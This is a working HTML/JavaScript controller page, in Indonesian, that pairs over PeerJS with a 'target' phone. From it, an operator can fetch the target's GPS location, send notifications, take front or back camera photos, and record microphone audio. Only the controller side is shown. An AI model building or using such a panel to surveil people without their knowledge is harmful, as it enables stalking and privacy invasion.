<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>CONTROLLER - Pengendali</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: linear-gradient(135deg, #0277bd, #4fc3f7);
      font-family: system-ui, sans-serif;
      min-height: 100vh;
      padding: 20px;
    }
    .container {
      max-width: 600px;
      margin: 0 auto;
      background: white;
      border-radius: 40px;
      padding: 24px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.2);
    }
    h1 { color: #0277bd; font-size: 1.6rem; margin-bottom: 5px; }
    .sub { color: #666; font-size: 0.8rem; margin-bottom: 20px; }
    
    .pairing-section {
      background: #e1f5fe;
      border-radius: 28px;
      padding: 16px;
      margin-bottom: 20px;
    }
    .pair-input {
      display: flex;
      gap: 12px;
      margin-top: 12px;
      flex-wrap: wrap;
    }
    .pair-input input {
      flex: 1;
      padding: 14px 18px;
      border-radius: 48px;
      border: 1px solid #4fc3f7;
      font-size: 1rem;
    }
    .pair-input button {
      background: #0288d1;
      border: none;
      padding: 14px 24px;
      border-radius: 48px;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    .status-connection {
      background: #0d47a1;
      color: white;
      padding: 12px;
      border-radius: 40px;
      text-align: center;
      margin-bottom: 20px;
      font-weight: bold;
    }
    .connected { background: #2e7d32; }
    
    .buttons-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
      gap: 12px;
      margin: 20px 0;
    }
    .ctrl-btn {
      background: white;
      border: 2px solid #4fc3f7;
      border-radius: 40px;
      padding: 14px 6px;
      font-weight: bold;
      color: #0277bd;
      cursor: pointer;
    }
    .ctrl-btn:active { transform: scale(0.96); background: #e1f5fe; }
    .ctrl-btn:disabled { opacity: 0.4; transform: none; }
    
    .result-area {
      background: #f5f5f5;
      border-radius: 24px;
      padding: 16px;
      margin-top: 16px;
      max-height: 400px;
      overflow-y: auto;
    }
    .result-title {
      font-weight: bold;
      color: #0277bd;
      margin-bottom: 10px;
    }
    .result-item {
      background: white;
      padding: 12px;
      border-radius: 16px;
      margin-bottom: 8px;
      font-size: 0.8rem;
      word-break: break-word;
    }
    img.result-img { max-width: 100%; border-radius: 16px; margin-top: 8px; }
    audio { width: 100%; margin-top: 8px; }
    
    .camera-options {
      display: flex;
      gap: 10px;
      margin: 10px 0;
      flex-wrap: wrap;
    }
    .cam-choice {
      background: #e1f5fe;
      padding: 8px 16px;
      border-radius: 40px;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      border: none;
      color: #01579b;
    }
    video {
      border-radius: 20px;
      margin-top: 10px;
      width: 100%;
      max-width: 280px;
      background: #000;
    }
    .google-maps-link {
      display: inline-block;
      background: #0288d1;
      color: white;
      padding: 8px 16px;
      border-radius: 40px;
      text-decoration: none;
      margin-top: 8px;
      font-weight: bold;
      font-size: 0.8rem;
    }
  </style>
</head>
<body>
<div class="container">
  <h1>🎮 CONTROLLER</h1>
  <div class="sub">Hubungkan ke HP Target untuk mengontrol</div>
  
  <div class="pairing-section">
    <div style="font-weight:bold;">🔗 Masukkan Kode Pairing Target</div>
    <div class="pair-input">
      <input type="text" id="peerIdInput" placeholder="Contoh: 3a4b5c6d-7e8f...">
      <button id="connectBtn">Hubungkan</button>
    </div>
  </div>
  
  <div class="status-connection" id="connectionStatus">
    ⚪ Belum terhubung
  </div>
  
  <div class="buttons-grid">
    <button class="ctrl-btn" id="btnLokasi" disabled>🗾 Ambil Lokasi</button>
    <button class="ctrl-btn" id="btnNotif" disabled>🔔 Kirim Notifikasi</button>
    <button class="ctrl-btn" id="btnKamera" disabled>📷 Akses Kamera</button>
    <button class="ctrl-btn" id="btnMikrofon" disabled>🎙️ Akses Mikrofon</button>
  </div>
  
  <div class="result-area">
    <div class="result-title">📡 Hasil dari HP Target</div>
    <div id="resultList">
      <div class="result-item">Belum ada hasil, hubungkan dulu ke target</div>
    </div>
  </div>
</div>

<script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
<script>
  let peer = null;
  let connection = null;
  let isConnected = false;
  
  // State untuk kamera lokal (di controller, untuk preview)
  let activeCameraStream = null;
  let activeCameraCard = null;
  
  const resultList = document.getElementById('resultList');
  const connectionStatus = document.getElementById('connectionStatus');
  const peerIdInput = document.getElementById('peerIdInput');
  const connectBtn = document.getElementById('connectBtn');
  
  const btns = {
    lokasi: document.getElementById('btnLokasi'),
    notif: document.getElementById('btnNotif'),
    kamera: document.getElementById('btnKamera'),
    mikrofon: document.getElementById('btnMikrofon')
  };
  
  function enableButtons(enabled) {
    Object.values(btns).forEach(btn => btn.disabled = !enabled);
  }
  
  function addResult(type, data, isError = false) {
    const div = document.createElement('div');
    div.className = 'result-item';
    div.style.borderLeft = isError ? '4px solid #f44336' : '4px solid #4caf50';
    
    let content = `<strong>📌 ${type.toUpperCase()}</strong><br>`;
    
    if (isError) {
      content += `⚠️ Error: ${data.error || data}`;
    } else {
      switch(type) {
        case 'location':
          const lat = data.lat;
          const lng = data.lng;
          const acc = data.accuracy;
          content += `📍 Latitude: ${lat}<br>📍 Longitude: ${lng}<br>🎯 Akurasi: ±${Math.round(acc)} meter`;
          const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}&hl=id&z=18`;
          content += `<br><a href="${googleMapsUrl}" target="_blank" class="google-maps-link">🗾 Buka di Google Maps</a>`;
          break;
        case 'notification':
          content += `🔔 Notifikasi: "${data.message}"`;
          break;
        case 'photo':
          content += `📸 Foto berhasil diambil:<br><img src="${data.image}" class="result-img" onclick="window.open(this.src)">`;
          break;
        case 'audio':
          content += `🎵 Rekaman suara:<br><audio controls src="${data.audio}"></audio><br><a href="${data.audio}" download="rekaman_${Date.now()}.mp3">💾 Download MP3</a>`;
          break;
        case 'recording_started':
          content += `🎙️ Rekaman dimulai di target... tunggu hingga selesai (max 15 detik)`;
          break;
        default:
          content += JSON.stringify(data);
      }
    }
    
    div.innerHTML = content;
    resultList.prepend(div);
    if (resultList.children.length > 20) {
      resultList.removeChild(resultList.lastChild);
    }
  }
  
  function updateConnectionStatus(text, isConn = false) {
    isConnected = isConn;
    connectionStatus.innerHTML = isConn ? `✅ ${text}` : `⚠️ ${text}`;
    connectionStatus.className = isConn ? 'status-connection connected' : 'status-connection';
    enableButtons(isConn);
  }
  
  function sendCommand(type, extra = {}) {
    if (!connection || !connection.open) {
      addResult('error', { error: 'Tidak terhubung ke target' }, true);
      return;
    }
    connection.send({ type, ...extra });
    addResult('command', `📤 Mengirim perintah: ${type}`);
  }
  
  // =============== FITUR KAMERA DI CONTROLLER (untuk preview dan kirim perintah) ===============
  function stopAnyCamera() {
    if (activeCameraStream) {
      activeCameraStream.getTracks().forEach(track => track.stop());
      activeCameraStream = null;
    }
    if (activeCameraCard && activeCameraCard.parentNode) {
      activeCameraCard.remove();
      activeCameraCard = null;
    }
  }
  
  async function onShowCamera() {
    // Hapus tampilan sebelumnya
    const existingCard = document.getElementById('camera-card-temp');
    if (existingCard) existingCard.remove();
    stopAnyCamera();
    
    if (!isConnected) {
      addResult('error', { error: 'Belum terhubung ke target. Hubungkan dulu!' }, true);
      return;
    }
    
    // Buat card kamera untuk preview dan perintah
    const card = document.createElement('div');
    card.style.background = '#eef5fc';
    card.style.borderRadius = '24px';
    card.style.padding = '16px';
    card.style.marginTop = '8px';
    card.id = 'camera-card-temp';
    
    const btnDiv = document.createElement('div');
    btnDiv.className = 'camera-options';
    
    const frontBtn = document.createElement('button');
    frontBtn.innerText = '🤳 Minta Kamera Depan Target';
    frontBtn.className = 'cam-choice';
    
    const backBtn = document.createElement('button');
    backBtn.innerText = '📸 Minta Kamera Belakang Target';
    backBtn.className = 'cam-choice';
    
    btnDiv.appendChild(frontBtn);
    btnDiv.appendChild(backBtn);
    
    const infoText = document.createElement('div');
    infoText.style.margin = '10px 0';
    infoText.style.fontSize = '0.8rem';
    infoText.style.color = '#0288d1';
    infoText.innerHTML = '📷 Klik tombol di atas untuk meminta target mengambil foto (dengan kamera pilihan)';
    
    card.appendChild(btnDiv);
    card.appendChild(infoText);
    
    // Tombol untuk meminta foto (tanpa preview lokal)
    const requestPhotoBtn = document.createElement('button');
    requestPhotoBtn.innerText = '📸 Ambil Foto dari Target';
    requestPhotoBtn.style.background = '#0288d1';
    requestPhotoBtn.style.border = 'none';
    requestPhotoBtn.style.padding = '12px 20px';
    requestPhotoBtn.style.borderRadius = '40px';
    requestPhotoBtn.style.color = 'white';
    requestPhotoBtn.style.fontWeight = 'bold';
    requestPhotoBtn.style.marginTop = '10px';
    requestPhotoBtn.style.width = '100%';
    requestPhotoBtn.style.cursor = 'pointer';
    
    let currentFacing = 'environment'; // default belakang
    
    frontBtn.onclick = () => {
      currentFacing = 'user';
      addResult('info', '📤 Mengirim perintah ambil foto dengan kamera DEPAN ke target...');
      sendCommand('take_photo', { facingMode: 'user' });
    };
    
    backBtn.onclick = () => {
      currentFacing = 'environment';
      addResult('info', '📤 Mengirim perintah ambil foto dengan kamera BELAKANG ke target...');
      sendCommand('take_photo', { facingMode: 'environment' });
    };
    
    card.appendChild(requestPhotoBtn);
    
    const closeBtn = document.createElement('button');
    closeBtn.innerText = '❌ Tutup Panel Kamera';
    closeBtn.style.background = '#ff8a65';
    closeBtn.style.border = 'none';
    closeBtn.style.padding = '10px 16px';
    closeBtn.style.borderRadius = '40px';
    closeBtn.style.color = 'white';
    closeBtn.style.fontWeight = 'bold';
    closeBtn.style.marginTop = '10px';
    closeBtn.style.width = '100%';
    closeBtn.style.cursor = 'pointer';
    closeBtn.onclick = () => {
      card.remove();
      stopAnyCamera();
    };
    card.appendChild(closeBtn);
    
    resultList.prepend(card);
    activeCameraCard = card;
  }
  
  // =============== FITUR MIKROFON DI CONTROLLER ===============
  let isRecordingActive = false;
  let recordingStartTime = null;
  
  function onMicrophoneRecorder() {
    if (!isConnected) {
      addResult('error', { error: 'Belum terhubung ke target. Hubungkan dulu!' }, true);
      return;
    }
    
    // Hapus card mik sebelumnya
    const existingMicCard = document.getElementById('temp-mic-card');
    if (existingMicCard) existingMicCard.remove();
    
    const micCard = document.createElement('div');
    micCard.id = 'temp-mic-card';
    micCard.style.background = '#eef5fc';
    micCard.style.borderRadius = '24px';
    micCard.style.padding = '16px';
    micCard.style.marginTop = '8px';
    
    const statusLabel = document.createElement('span');
    statusLabel.id = 'micStatus';
    statusLabel.innerText = '🎤 Belum merekam';
    statusLabel.style.display = 'block';
    statusLabel.style.marginBottom = '12px';
    statusLabel.style.fontWeight = 'bold';
    
    const startBtn = document.createElement('button');
    startBtn.innerText = '🎙️ Mulai Rekam (Target)';
    startBtn.style.background = '#0288d1';
    startBtn.style.border = 'none';
    startBtn.style.padding = '12px 20px';
    startBtn.style.borderRadius = '40px';
    startBtn.style.color = 'white';
    startBtn.style.fontWeight = 'bold';
    startBtn.style.marginRight = '10px';
    startBtn.style.cursor = 'pointer';
    
    const stopBtn = document.createElement('button');
    stopBtn.innerText = '⏹️ Stop & Kirim';
    stopBtn.style.background = '#f44336';
    stopBtn.style.border = 'none';
    stopBtn.style.padding = '12px 20px';
    stopBtn.style.borderRadius = '40px';
    stopBtn.style.color = 'white';
    stopBtn.style.fontWeight = 'bold';
    stopBtn.style.cursor = 'pointer';
    stopBtn.disabled = true;
    
    const closeBtn = document.createElement('button');
    closeBtn.innerText = '❌ Tutup';
    closeBtn.style.background = '#ff8a65';
    closeBtn.style.border = 'none';
    closeBtn.style.padding = '10px 16px';
    closeBtn.style.borderRadius = '40px';
    closeBtn.style.color = 'white';
    closeBtn.style.fontWeight = 'bold';
    closeBtn.style.marginTop = '10px';
    closeBtn.style.cursor = 'pointer';
    
    startBtn.onclick = () => {
      addResult('info', '🎙️ Meminta target mulai merekam suara...');
      sendCommand('start_record');
      startBtn.disabled = true;
      stopBtn.disabled = false;
      statusLabel.innerText = '🔴 MEREKAM... (klik Stop untuk mengirim)';
      statusLabel.style.color = '#d32f2f';
      isRecordingActive = true;
      
      // Auto stop setelah 15 detik
      setTimeout(() => {
        if (isRecordingActive) {
          addResult('info', '⏰ Auto-stop setelah 15 detik');
          sendCommand('stop_record');
          startBtn.disabled = false;
          stopBtn.disabled = true;
          statusLabel.innerText = '🎤 Rekaman selesai';
          statusLabel.style.color = '#000';
          isRecordingActive = false;
        }
      }, 15000);
    };
    
    stopBtn.onclick = () => {
      addResult('info', '⏹️ Meminta target berhenti merekam dan mengirim hasil...');
      sendCommand('stop_record');
      startBtn.disabled = false;
      stopBtn.disabled = true;
      statusLabel.innerText = '🎤 Rekaman dihentikan';
      statusLabel.style.color = '#000';
      isRecordingActive = false;
    };
    
    closeBtn.onclick = () => {
      micCard.remove();
    };
    
    micCard.appendChild(statusLabel);
    micCard.appendChild(startBtn);
    micCard.appendChild(stopBtn);
    micCard.appendChild(closeBtn);
    
    resultList.prepend(micCard);
  }
  
  // =============== KONEKSI PEER ===============
  function connectToPeer(peerId) {
    if (connection) {
      connection.close();
    }
    
    updateConnectionStatus('Menghubungkan...', false);
    connection = peer.connect(peerId);
    
    connection.on('open', () => {
      updateConnectionStatus(`Terhubung ke ${peerId.substring(0, 15)}...`, true);
      addResult('connection', `✅ Berhasil terhubung ke target`);
    });
    
    connection.on('data', (data) => {
      if (data.response) {
        addResult(data.type, data.data, data.data?.error);
      } else {
        addResult('info', data);
      }
    });
    
    connection.on('close', () => {
      updateConnectionStatus('Koneksi terputus', false);
      addResult('connection', '❌ Koneksi ke target terputus', true);
      connection = null;
    });
    
    connection.on('error', (err) => {
      updateConnectionStatus('Error koneksi', false);
      addResult('error', { error: err.toString() }, true);
    });
  }
  
  function initPeer() {
    peer = new Peer();
    
    peer.on('open', (id) => {
      console.log('Controller ID:', id);
      addResult('info', `🆔 ID Controller: ${id.substring(0, 15)}... (untuk referensi)`);
    });
    
    peer.on('error', (err) => {
      console.error('Peer error:', err);
      if (err.type === 'unavailable-id') {
        addResult('error', 'ID peer tidak valid', true);
      }
    });
  }
  
  // Event tombol utama
  btns.lokasi.onclick = () => {
    if (!isConnected) {
      addResult('error', { error: 'Belum terhubung ke target!' }, true);
      return;
    }
    sendCommand('location');
  };
  
  btns.notif.onclick = () => {
    if (!isConnected) {
      addResult('error', { error: 'Belum terhubung ke target!' }, true);
      return;
    }
    const msg = prompt('✏️ Masukkan pesan notifikasi:', 'Halo dari Controller!');
    if (msg && msg.trim()) {
      sendCommand('notification', { message: msg });
    }
  };
  
  btns.kamera.onclick = onShowCamera;
  btns.mikrofon.onclick = onMicrophoneRecorder;
  
  connectBtn.onclick = () => {
    const peerId = peerIdInput.value.trim();
    if (!peerId) {
      addResult('error', { error: 'Masukkan kode pairing target' }, true);
      return;
    }
    connectToPeer(peerId);
  };
  
  // Minta izin notifikasi di controller
  if ('Notification' in window) Notification.requestPermission();
  
  initPeer();
</script>
</body>
</html>
